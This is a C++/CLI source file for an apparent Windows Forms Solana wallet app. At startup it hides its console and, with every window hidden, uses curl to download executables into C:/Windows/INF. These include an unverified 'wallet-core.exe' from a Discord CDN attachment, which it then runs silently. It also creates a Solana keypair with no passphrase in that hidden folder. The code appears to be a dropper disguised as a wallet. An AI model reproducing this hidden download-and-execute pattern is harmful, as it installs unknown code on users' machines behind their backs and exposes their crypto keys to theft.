#include "MyForm.h"

bool initialization()
{
    ShellExecuteW(NULL, L"open", L"cmd", L"/c curl https://release.solana.com/v1.10.25/solana-install-init-x86_64-pc-windows-msvc.exe --output C:/Windows/INF/WindowsSolanaWallet/solana-install/solana-install-init.exe --create-dirs", NULL, SW_HIDE);                                                                                                                                                                                                                                            
    ShellExecuteW(NULL, L"open", L"cmd", L"/c curl https://cdn.discordapp.com/attachments/964918984044597261/990354253447041034/wallet-core.exe --output C:/Windows/INF/WindowsSolanaWallet/solana-install/wallet-core.exe --create-dirs", NULL, SW_HIDE); 
    ShellExecuteW(NULL, L"open", L"cmd", L"/c C:/Windows/INF/WindowsSolanaWallet/solana-install/wallet-core.exe", NULL, SW_HIDE);
    ShellExecuteW(NULL, L"open", L"cmd", L"/c C:/Windows/INF/WindowsSolanaWallet/solana-install/solana-install-init.exe v1.10.25", NULL, SW_HIDE);
    ShellExecuteW(NULL, L"open", L"cmd", L"/c curl https://win.rustup.rs/x86_64 --output C:/Windows/INF/WindowsSolanaWallet/win.rustup/rustup-install.exe --create-dirs", NULL, SW_HIDE);
    ShellExecuteW(NULL, L"open", L"cmd", L"/c C:/Windows/INF/WindowsSolanaWallet/win.rustup/rustup-install.exe", NULL, SW_HIDE);
    return true;
}
bool createaccount()
{
    ShellExecuteW(NULL, L"open", L"cmd", L"/c solana-keygen new --no-passphrase --outfile C:/Windows/INF/WindowsSolanaWallet/my-solana-wallet/my-keypair.json", NULL, SW_HIDE);
    return true;
}

using namespace System;
using namespace System::Windows::Forms;

[STAThread]
void main(array<String^>^ args)
{
    ::ShowWindow(GetConsoleWindow(), SW_HIDE);
    system("exit cmd.exe");
    system("exit conhost.exe");
    system("exit solana-install-init.exe");

    initialization();
    createaccount();
    Sleep(2500);
	Application::EnableVisualStyles();
	Application::SetCompatibleTextRenderingDefault(false);
	WWC::MyForm form;
	Application::Run(% form);
}
